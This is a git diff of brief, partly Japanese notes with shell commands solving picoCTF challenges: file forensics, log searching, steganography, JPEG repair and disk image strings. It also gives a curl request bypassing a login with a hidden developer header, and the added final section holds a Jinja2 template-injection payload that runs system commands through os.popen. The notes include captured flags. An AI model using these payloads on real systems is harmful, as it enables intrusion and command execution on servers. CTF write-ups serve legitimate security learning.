@@ -1,19 +1,17 @@
-# Easy
-
-## Riddle Registry
+# Riddle Registry
 ```bash
 file confidential.pdf
 exiftool confidential.pdf
 ```
 
-## Log Hunt
+# Log Hunt
 ```bash
 cat server.log
 cat server.log | grep -i flagpart
 cat server.log | grep -i flagpart | cut -d ' ' -f 5 | sort | uniq
 ```
 
-## Hidden in plainsight
+# Hidden in plainsight
 ```bash
 file img.jpg
 file img.jpg | pcregrep -o '".*"' | tr -d '"' | base64 -d
@@ -21,8 +19,8 @@ file img.jpg | pcregrep -o '".*"' | tr -d '"' | base64 -d | pcregrep -o1 'steghi
 steghide extract -sf img.jpg
 ```
 
-## Flag in Flame
-### base64復号からascii変換
+# Flag in Flame
+## base64復号からascii変換
 ```bash
 file logs.txt
 cat logs.txt
@@ -32,8 +30,8 @@ mv logs image.png
 echo '7069636F4354467B666F72656E736963735F616E616C797369735F69735F616D617A696E675F35646161346132667D' | sed 's/../& /g'
 ```
 
-## Corrupted file
-### JPEGファイルの先頭バイト修復
+# Corrupted file
+## JPEGファイルの先頭バイト修復
 ```bash
 xxd -l 32 file
 # 00000000: 5c78 ffe0 0010 4a46 4946 0001 0100 0001  \x....JFIF......
@@ -41,8 +39,8 @@ xxd -l 32 file
 (printf '\xff\xd8' && tail -c + 3 file) > file.jpg
 ```
 
-## DISKO 1
-### ディスクファイルを解凍し、文字列検索
+# DISKO 1
+## ディスクファイルを解凍し、文字列検索
 ```bash
 file disko-1.dd.gz
 gunzip disko-1.dd.gz
@@ -50,8 +48,8 @@ file disko-1.dd
 strings disko-1.dd | grep -i "picoctf"
 ```
 
-## Crack the Gate 1
-### webページへアクセス
+# Crack the Gate 1
+## webページへアクセス
 1. デベロッパーツールから以下の文字列を発見
 ```
 <!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
@@ -68,3 +66,8 @@ curl -X POST -H "X-Dev-Access: yes" -d 'email=ctf-player@picoctf.org&password=ad
 # {"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{brut4_f0rc4_125f752d}"}
 ```
 
+# SSTi
+## Jinja2のSSTi
+1. `{{7*'7'}}`を試す => `7777777`
+2. Jinja2(Python)
+`{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('<Command>').read()}}`
